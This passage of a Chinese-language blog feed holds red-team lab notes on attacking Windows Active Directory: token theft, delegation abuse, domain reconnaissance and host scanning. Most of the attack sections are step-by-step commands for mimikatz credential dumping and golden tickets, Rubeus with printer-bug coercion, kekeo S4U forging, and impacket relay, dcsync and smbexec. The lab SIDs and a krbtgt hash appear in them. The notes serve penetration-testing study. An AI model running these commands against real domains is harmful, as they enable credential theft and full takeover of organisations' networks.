alt="image-20220325175250229"></p><p>注入之后进行会话交互就可以执行命令</p><pre class="line-numbers language-none"><code class="language-none">shell whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/24/day42/image-20220325175445405.png" alt="image-20220325175445405"></p><h3 id="窃取令牌"><a href="#窃取令牌" class="headerlink" title="窃取令牌"></a>窃取令牌</h3><p>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。</p><p><img src="/2022/03/24/day42/image-20220325175601604.png" alt="image-20220325175601604"></p><p>窃取令牌后，权限从当前管理员到了域管</p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 获取域控权限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>委派攻击</title>
      <link href="/2022/03/22/day41/"/>
      <url>/2022/03/22/day41/</url>
      
        <content type="html"><![CDATA[<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><span id="more"></span><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。 </p><p><strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p><p>三种攻击手段：</p><ul><li>非约束委派</li><li>约束委派</li><li>资源委派</li></ul><h3 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h3><p>**在域内只有主机账号和服务账号才有委派属性 **</p><p><strong>主机账号</strong>：活动目录中的computers组内的计算机，也被称为机器账号。 </p><p><strong>服务账号</strong>：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer,MYSQL等；域用户通过注册SPN也能成为服务账号。</p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>user访问serverA，向DC发起认证，DC会检查serverA机器账号的属性，如果是非约束委派的话，会把用户的TGT放在ST票据中并一起发送给serverA，这样serverA在验证ST票据的同时也获取到了用户的TGT，并把TGT储存在自己的lsass进程中以备下次重用，从而serverA就可以使用这个TGT，来模拟这个user访问任何服务。</p><p>如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境。</p><h4 id="搭建复现"><a href="#搭建复现" class="headerlink" title="搭建复现"></a>搭建复现</h4><p>域控 ad1 备份 ad2 </p><p>server1 server2是俩个域普通用户</p><p>在ad1中</p><p><strong>新建用户</strong></p><p>我们会发现它没有委派选项</p><p><img src="/2022/03/22/day41/image-20220323150537635.png" alt="image-20220323150537635"></p><p><strong>注册服务用户</strong></p><p>注册服务账号后他会具有委派选项</p><pre class="line-numbers language-none"><code class="language-none">setspn -A https/web web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323150729514.png" alt="image-20220323150729514"></p><p>这条语句来删除服务</p><pre class="line-numbers language-none"><code class="language-none">setspn -d https/web web<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>设置主机委派</strong></p><p><img src="/2022/03/22/day41/image-20220323150834346.png" alt="image-20220323150834346"></p><blockquote><p>当服务账号或者主机被设置为非约束性委派时，其userAccountControl属性会包含TRUSTED_FOR_DELEGATION</p></blockquote><p><strong>我们将俩台用户也设置为委派，重启</strong></p><h4 id="powerview查询非约束委派"><a href="#powerview查询非约束委派" class="headerlink" title="powerview查询非约束委派"></a>powerview查询非约束委派</h4><p>在域用户中</p><p>powershell脚本，可利用此来查询非约束委派主机或服务用户</p><p>导入模块</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView2.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询非约束主机</p><pre class="line-numbers language-none"><code class="language-none">Get-NetComputer -Unconstrained -Domain redteam.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323152046075.png" alt="image-20220323152046075"></p><p>可看到之前配置的俩台域用户查询出来了</p><p>查询非约束用户</p><pre class="line-numbers language-none"><code class="language-none">Get-NetUser -Unconstrained -Domain redteam.club | select name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="adfind查询非约束委派"><a href="#adfind查询非约束委派" class="headerlink" title="adfind查询非约束委派"></a>adfind查询非约束委派</h4><p>查询非约束委派的主机</p><pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=redteam,DC=club" -f "(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323153514742.png" alt="image-20220323153514742"></p><p>非约束委派的用户：</p><pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=redteam,DC=club" -f "(&amp;(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323153527476.png" alt="image-20220323153527476"></p><h4 id="mimikatz在域控访问域内主机时导出凭证"><a href="#mimikatz在域控访问域内主机时导出凭证" class="headerlink" title="mimikatz在域控访问域内主机时导出凭证"></a>mimikatz在域控访问域内主机时导出凭证</h4><p>思路：在域控访问域内的非约束委派主机时，用mimikatz导出缓存的凭证并注入内存，即可拿到域控权限</p><p><strong>域控使用winrm服务器远程连接域内主机</strong></p><pre class="line-numbers language-none"><code class="language-none">Enter-PSSession -ComputerName 12server2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323153933304.png" alt="image-20220323153933304"></p><p>此时域控的凭证已经缓存到域内主机</p><p><strong>在域内主机使用mimikatz保存凭证</strong></p><p>使用域内主机的管理员账户</p><pre class="line-numbers language-none"><code class="language-none">进入debug模式privilege::debug 导出凭证sekurlsa::tickets /export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323154454951.png" alt="image-20220323154454951"></p><p><img src="/2022/03/22/day41/image-20220323154650139.png" alt="image-20220323154650139"></p><p>导出之后使用krbtgt的管理员凭证</p><p><strong>将此凭证导入内存</strong></p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt 票据名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>klist可查看是否导入</p><p><img src="/2022/03/22/day41/image-20220323154822851.png" alt="image-20220323154822851"></p><p><strong>拿到了域控权限</strong></p><p><img src="/2022/03/22/day41/image-20220323154902995.png" alt="image-20220323154902995"></p><p>将此凭证保存下来，拿到另一台域内主机下，他也可以有域控权限</p><h4 id="spooler验证域控身份监听并制作黄金票据"><a href="#spooler验证域控身份监听并制作黄金票据" class="headerlink" title="spooler验证域控身份监听并制作黄金票据"></a>spooler验证域控身份监听并制作黄金票据</h4><p>思路：利用打印服务强制让域控向域内主机验证身份，此时我们在域内主机用rubeus监听TGS并截取域控TGT，注入后再制作黄金票据，即可拿到域控权限</p><p>登录域内主机的管理员账户</p><p>windows下默认spooler打印服务开启，并且此主机是非约束委派</p><p><img src="/2022/03/22/day41/image-20220323161530733.png" alt="image-20220323161530733"></p><p><strong>在管理员cmd下开启rubeus监听事件id4624</strong></p><p>打开管理员的cmd</p><pre class="line-numbers language-none"><code class="language-none">runas /profile /user:12server2\administrator cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe monitor /interval:1 /filteruser:ad1$ &gt;c:\hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启监听后可第一事件截取到TGT，监听域控的登录</p><p><strong>利用打印服务，强制域控向本主机验证身份</strong></p><pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe ad1 12server2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样我们的rubeus就可以监听到TGS，拿到TGT</p><p><img src="/2022/03/22/day41/image-20220323170911339.png" alt="image-20220323170911339"></p><p>使用powershell把它转换为正常的TGT</p><pre class="line-numbers language-none"><code class="language-none">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("得到的 base64"))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323171314744.png" alt="image-20220323171314744"></p><p><strong>使用mimikatz导入</strong></p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt 票据路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导入之后我们访问域控，发现拒绝访问</p><p><img src="/2022/03/22/day41/image-20220323171548158.png" alt="image-20220323171548158"></p><p>所以这里还没拿到域控权限</p><p>我们可以制作黄金票据以拿到域控权限</p><p><strong>制作黄金票据</strong></p><p>我们这里导入了域控的TGT，所以可查询到</p><p>拿域控的sid</p><pre class="line-numbers language-none"><code class="language-none">whoami /all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323172033291.png" alt="image-20220323172033291"></p><p>拿krbtgt的NTLM hash</p><p>使用mimikatz</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "lsadump::dcsync /domain:redteam.club /all /csv" "exit"&gt;log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323172129021.png" alt="image-20220323172129021"></p><p>mimikatz制作</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden /domain:redteam.club /sid:S-1-5-21-2365300756-2663045586-4193326672 /krbtgt:b6e0fcce3106665064de4917394ccc27 /user:administrator /ticket:ntlm.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323172528580.png" alt="image-20220323172528580"></p><p>导入即可拿到域控权限</p><p><img src="/2022/03/22/day41/image-20220323172631337.png" alt="image-20220323172631337"></p><h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>多用于权限维持</p><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U，其中S4U支持两个子协议：Service for User to Self ( S4U2Self )和 Service for User to Proxy ( S4U2proxy )，这两个扩展都允许服务代表用户从KDC请求票证。 </p><p>S4U2self可以代表自身请求针对其自身的可转发的Kerberos服务票据(ST1) ； </p><p>S4U2proxy可以以用户的名义请求其它服务的ST2 ，约束委派就是限制了S4U2proxy扩展的范围。</p><blockquote><p>S4U2Self (以用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求)。</p><p>通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是协议转换 。有时用户会通过其他协议(例如NTLM或基于表单的身份验证)对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS ，然后可以在调用S4U2Proxy时将其作为依据。</p><p>例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求。</p></blockquote><blockquote><p>S4U2proxy (以用户的可转发的ST1请求用于访问服务器的ST2)</p><p>此拓展是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p></blockquote><h4 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h4><p>user访问serviceA，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对serviceA进行访问。如果配置了serviceA到serviceB的约束委派，则serviceA能使用S4U2Proxy协议，将用户发给自己的可转发的ST1票据以用户的身份发给DC。域控返回serviceA一个用来访问serviceB的ST2票据，这样serviceA就能以用户的身份对serviceB发起访问。</p><p>由于服务用户只能获取某个用户（或主机）的服务的ST1而非TGT ， 所以只能模拟用户访问特定的服务 ，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以 伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2 。</p><h4 id="搭建复现-1"><a href="#搭建复现-1" class="headerlink" title="搭建复现"></a>搭建复现</h4><p><strong>新建用户</strong></p><p><strong>添加spn标识</strong></p><pre class="line-numbers language-none"><code class="language-none">setspn -A cifs/12server2.redteam.club websec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323201123020.png" alt="image-20220323201123020"></p><p>添加spn标识后就有了委派选项</p><p><strong>设置约束委派</strong></p><p><img src="/2022/03/22/day41/image-20220323201243045.png" alt="image-20220323201243045"></p><p>查看-高级功能-属性编辑器查看</p><p>设置了约束委派后userAccount会存在TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 关键字</p><p><img src="/2022/03/22/day41/image-20220323201535291.png" alt="image-20220323201535291"></p><h4 id="adfind查询约束委派用户"><a href="#adfind查询约束委派用户" class="headerlink" title="adfind查询约束委派用户"></a>adfind查询约束委派用户</h4><p>登录域内用户</p><pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=redteam,DC=club" -f "(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))" cn distinguishedName msds-allowedtodelegateto <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323203010661.png" alt="image-20220323203010661"></p><h4 id="kekeo攻击"><a href="#kekeo攻击" class="headerlink" title="kekeo攻击"></a>kekeo攻击</h4><p>流程：kekeo请求服务用户的TGT，利用TGT伪造S4U请求以administrator身份访问websec的ST</p><p><strong>kekeo请求服务的TGT</strong></p><pre class="line-numbers language-none"><code class="language-none">tgt::ask /user:websec /domain:redteam.club /password:pass@123 /ticket:test.kirbi <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同理此处利用ntlm hash也是可以进行请求的 </p><pre class="line-numbers language-none"><code class="language-none">tgt::ask /user:websec /domain:redteam.club /NTLM:XXXXX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220323203755970.png" alt="image-20220323203755970"></p><p><strong>利用此TGT票据伪造S4U请求以管理员身份访问websec的ST</strong></p><pre class="line-numbers language-none"><code class="language-none">tgs::s4u /tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi /user:Administrator@redteam.club /service:cifs/ad1.redteam.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会生成administrator的ticket (用于访问websec的CIFS服务)，导入这个tiket即可访问websec的cifs服务:</p><p><img src="/2022/03/22/day41/image-20220323210747014.png" alt="image-20220323210747014"></p><p><img src="/2022/03/22/day41/image-20220323210942766.png" alt="image-20220323210942766"></p><p>这里不能访问ad2</p><h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><h4 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h4><p>server2012后引入了基于资源的约束委派，无需域管设置相关属性，请求ST的过程与约束委派类似，传统的约束委派S4U2Self返回的票据一定是可转发的，如果不可转发那么S4U2Proxy将失败；但是基于资源的约束委派不同，就算S4U2Self返回的票据不可转，S4U2Proxy也是可以成 功，并且S4U2Proxy返回的票据总是可转发 </p><p>基于资源的约束委派把委派的权限赋予给机器自身，机器自己决定谁可以委派控制我，机器可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置基于资源的约束委派，这里关键在于谁可以修改此属性</p><blockquote><p>S4U2Self返回的票据可不可以转发由TrustedToAuthenticationForDelegation决定</p><p>需要用户对主机的属性具备写权限 </p></blockquote><p>条件：</p><ul><li>一个机器账户</li><li>一个有权修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的账户</li></ul><h4 id="域普通账号提权到域管理员"><a href="#域普通账号提权到域管理员" class="headerlink" title="域普通账号提权到域管理员"></a>域普通账号提权到域管理员</h4><p><strong>创建机器主机账号</strong></p><p>在kali中，利用impack-master的脚本</p><pre class="line-numbers language-none"><code class="language-none">python3 addcomputer.py -method SAMR -dc-ip 10.10.10.142 -computer-name moonsec -computer-pass pass@123 "redteam.club/hack:pass@123"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加进去后域控上会有主机账号</p><p><img src="/2022/03/22/day41/image-20220324162839266.png" alt="image-20220324162839266"></p><p><strong>中继&amp;委派</strong></p><p>执行ntlmrelayx.py脚本进行NTLM中继攻击，设置SMB服务器并将认证凭据中继到LDAP协议，进行监听</p><pre class="line-numbers language-none"><code class="language-none">python3 ntlmrelayx.py -t ldap://10.10.10.142 -smb2support --remove-mic -- delegate-access --escalate-user moonsec\$ -debug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中–remove-mic选项用于清除MIC标志，–escalate-user用于提升指定用户权限</p><p><img src="/2022/03/22/day41/image-20220324163250621.png" alt="image-20220324163250621"></p><p>域控有两台域控 10.10.10.142 主控；10.10.10.140是备份域控；10.10.10.139 是中继主机（kali）</p><p><strong>设置委派</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 printerbug.py redteam.club/hack:pass@123@10.10.10.140 10.10.10.139<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220324163600900.png" alt="image-20220324163600900"></p><p><strong>获取服务票据</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 getST.py -dc-ip 10.10.10.142 redteam/moonsec\$:pass@123 -spn cifs/ad2.redteam.club -impersonate administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220324163737058.png" alt="image-20220324163737058"></p><p>服务票据被保存下来了</p><p><strong>修改变量值</strong></p><pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=administrator.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>导出hash</strong></p><pre class="line-numbers language-none"><code class="language-none">导出域控hashpython3 secretsdump.py -k -no-pass ad2.redteam.club -just-dc-user administrator 导出全部hashpython3 secretsdump.py -k -no-pass ad2.redteam.club -just-dc-ntlm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220324164044172.png" alt="image-20220324164044172"></p><p>这里拿到啦krbtgt的NTLM hash，我们可制作黄金票据来访问域控</p><p><strong>使用smbexec无密码访问</strong></p><pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py -no-pass -k ad2.redteam.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问到备份域控，权限是system</p><h4 id="攻击其他域主机获取system权限"><a href="#攻击其他域主机获取system权限" class="headerlink" title="攻击其他域主机获取system权限"></a>攻击其他域主机获取system权限</h4><p>使用脚本查询域普通用户加入域的主机</p><pre class="line-numbers language-none"><code class="language-none">using System;using System.Security.Principal;using System.DirectoryServices;namespace ConsoleApp9{    class Program    {        static void Main(string[] args)        {            DirectoryEntry ldap_conn = new DirectoryEntry("LDAP://dc=redteam,dc=club");            DirectorySearcher search = new DirectorySearcher(ldap_conn);            String query = "(&amp;(objectClass=computer))";//查找计算机            search.Filter = query;            foreach (SearchResult r in search.FindAll())            {                String mS_DS_CreatorSID = "";                String computername = "";                try                {                    computername = r.Properties["dNSHostName"][0].ToString();                    mS_DS_CreatorSID = (new SecurityIdentifier((byte[])r.Properties["mS-DS-CreatorSID"][0], 0)).ToString();                    //Console.WriteLine("{0} {1}\n", computername, mS_DS_CreatorSID);                }                catch                {                    ;                }                //再通过sid找用户名                String UserQuery = "(&amp;(objectClass=user))";                DirectorySearcher search2 = new DirectorySearcher(ldap_conn);                search2.Filter = UserQuery;                foreach (SearchResult u in search2.FindAll())                {                    String user_sid = (new SecurityIdentifier((byte[])u.Properties["objectSid"][0], 0)).ToString();                    if (user_sid == mS_DS_CreatorSID)                    {                        //Console.WriteLine("debug");                        String username = u.Properties["name"][0].ToString();                        Console.WriteLine("[*] [{0}] -&gt; creator  [{1}]", computername, username);                    }                }            }        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用此命令将cs编译为exe</strong></p><pre class="line-numbers language-none"><code class="language-none">进入到此路径cd /d C:\Windows\Microsoft.NET\Framework64\v2.0.50727编译csc /out:E:\ConsoleApp9.exe E:\ConsoleApp9.cs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在域内主机运行此脚本</strong></p><p><img src="/2022/03/22/day41/image-20220324153442714.png" alt="image-20220324153442714"></p><p><strong>使用SharpAllowedToAct修改委派</strong></p><p><a href="https://github.com/HPVCA/SharpAllowedToAct">https://github.com/HPVCA/SharpAllowedToAct</a></p><pre class="line-numbers language-none"><code class="language-none">SharpAllowedToAct.exe -m hack -p pass@123 -t 12server2 -a 10.10.10.142 redteam.club<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/22/day41/image-20220324153830435.png" alt="image-20220324153830435"></p><p>设置成功后域控下会多了一个hack的主机账号</p><p><img src="/2022/03/22/day41/image-20220324160242853.png" alt="image-20220324160242853"></p><p><strong>使用脚本获取服务票据</strong></p><p>kali下的impact-master脚本</p><pre class="line-numbers language-none"><code class="language-none">python3 getST.py -dc-ip 10.10.10.142 redteam/hack\$:pass@123 -spn cifs/12server2.redteam.club -impersonate administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会把得到的服务票据保存下来</p><p><img src="/2022/03/22/day41/image-20220324162409309.png" alt="image-20220324162409309"></p><p><strong>获取域管理员权限</strong></p><p>先修改变量值，然后使用smbexec无密码登录</p><pre class="line-numbers language-none"><code class="language-none">export KRB5CCNAME=administrator.ccache python3 smbexec.py -no-pass -k 12server2.redteam.club<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ip是server2的ip，权限是管理员权限</p><p><img src="/2022/03/22/day41/image-20220324162622163.png" alt="image-20220324162622163"></p>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 委派攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透</title>
      <link href="/2022/03/09/day40/"/>
      <url>/2022/03/09/day40/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><span id="more"></span><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组是局域网中的一个概念，他是长久的资源管理模式。默认情况下使用工作组方式进行资源管理，将不同的 computer 按照不同的要求分类到不同的组</p><p><img src="/2022/03/09/day40/image-20220313141541646.png" alt="image-20220313141541646"></p><h3 id="域-domain"><a href="#域-domain" class="headerlink" title="域(domain)"></a>域(domain)</h3><p>一个有安全边界的计算机集合</p><blockquote><p> 安全边界，意思是在两个域中，一个域中的用户无法访问另一个域中的资源</p></blockquote><p>可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，就必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。</p><h3 id="域名服务器DNS"><a href="#域名服务器DNS" class="headerlink" title="域名服务器DNS"></a>域名服务器DNS</h3><p>用于实现域名和与之相对应的 IP 地址转换的服务器。</p><p>因为域名的计算机是使用DNS 来定位域控制器、服务器及其他计算机、网络服务的，所以域的名字就是DNS 域的名字。</p><p>在内网渗透测试中，大都是通过寻找 DNS 服务器来确定域控制器的位置的</p><blockquote><p>DNS服务器和域控制器通常配置在同一台机器上</p></blockquote><h3 id="域术语"><a href="#域术语" class="headerlink" title="域术语"></a>域术语</h3><p>DC:域控，域的创建者</p><p>域管理:域控上的管理员</p><p>AD 活动目录:Active Directory</p><p>NTDS.dit:域用户帐户以域数据库的形式保存在活动目录中</p><p>Ntdsutil.exe-ntdsutil.exe 是域控制器自带的域数据库管理工具，从 windowsServer 2008 开始就默认自带了。因此我们可以通过 ntdsutil.exe 提取出域中所有的域用户信息</p><p>常见结构:组织单元(OU)、域(DOMAIN)、域树(tree)、域森林(forest)，在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据</p><p>活动目录: </p><ul><li><p>帐号集中管理：所有帐号均存在服务器上，方便对帐号的重命名/重置密码。</p></li><li><p>软件集中管理：统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。</p></li><li><p>环境集中管理：利用 AD 可以统一客户端桌面，IE，TCP/IP 等设置。</p></li><li><p>增强安全性：统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</p></li><li><p>更可靠：更少的宕机时间。如：利用 AD 控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。</p></li><li><p>活动目录为 Microsoft 统一管理的基础平台，其它 ISA、Exchange、SMS 等服务都依赖于这个基础平台</p></li></ul><h2 id="域搜集信息命令"><a href="#域搜集信息命令" class="headerlink" title="域搜集信息命令"></a>域搜集信息命令</h2><pre class="line-numbers language-none"><code class="language-none">query user || qwinsta 查看当前在线用户net user 查看本机用户net user /domain 查看域用户net view &amp; net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多net view /domain 查看有几个域net view \\\\dc 查看 dc 域内共享文件net group /domain 查看域里面的组net group "domain admins" /domain 查看域管net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管net group "domain controllers" /domain 域控net time /domain 查看域控net config workstation 当前登录域 - 计算机名 - 用户名net use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfig /all 查看当前环境systeminfotasklist /svctasklist /S ip /U domain\username /P /V 查看远程计算机tasklistnet localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组netstat -anonltest /dclist:xx 查看域控whoami /all 查看 Mandatory Label uac 级别和 sid 号net sessoin 查看远程连接 session (需要管理权限)net share 共享目录cmdkey /l 查看保存登陆凭证echo %logonserver% 查看登陆域spn –l administrator spn 记录set 环境变量dsquery server - 查找目录中的 AD DC/LDS 实例dsquery user - 查找目录中的用户dsquery computer 查询所有计算机名称 windows 2003dir /s *.exe 查找指定目录下及子目录下没隐藏文件arp -a 查询通信<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>在域内进行横行渗透时，首先要收集主机的端口和 ip 信息</p><pre class="line-numbers language-none"><code class="language-none">net view /domain 查询域<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发生系统错误 6118 出现这种错误时 Computer Browser服务被禁用了，需要在域控开启</p><pre class="line-numbers language-none"><code class="language-none">net view /domain:域名 查看主机<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313143024234.png" alt="image-20220313143024234"></p><p><strong>arp -a 查询通信</strong></p><p><img src="/2022/03/09/day40/image-20220313143300136.png" alt="image-20220313143300136"></p><p><strong>nbtscscan查询主机</strong></p><pre class="line-numbers language-none"><code class="language-none">nbtscan.exe -r 192.168.0.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313143422438.png" alt="image-20220313143422438"></p><p><strong>bat 命令发现主机</strong></p><pre class="line-numbers language-none"><code class="language-none">for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1|find /i "ttl="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>powershell 脚本扫描 IP 地址存活</strong></p><p><a href="https://gallery.technet.microsoft.com/scriptcenter/Invoke-TSPingSweep-b71f1b9b">https://gallery.technet.microsoft.com/scriptcenter/Invoke-TSPingSweep-b71f1b9b</a></p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -Command "Import-Module ./Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.1.0 -EndAddress 192.168.1.255"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PowerShell端口扫描</p><p>针对单个 IP 的多个端口的扫描：</p><pre class="line-numbers language-none"><code class="language-none">1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.0.135",$_)) "Port $_ is open!"} 2&gt;$null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/09/day40/image-20220313144746336.png" alt="image-20220313144746336"></p><p>针对某 IP 段中单个端口的扫描：</p><pre class="line-numbers language-none"><code class="language-none">foreach ($ip in 1..20) {Test-NetConnection -Port 80 -InformationLevel 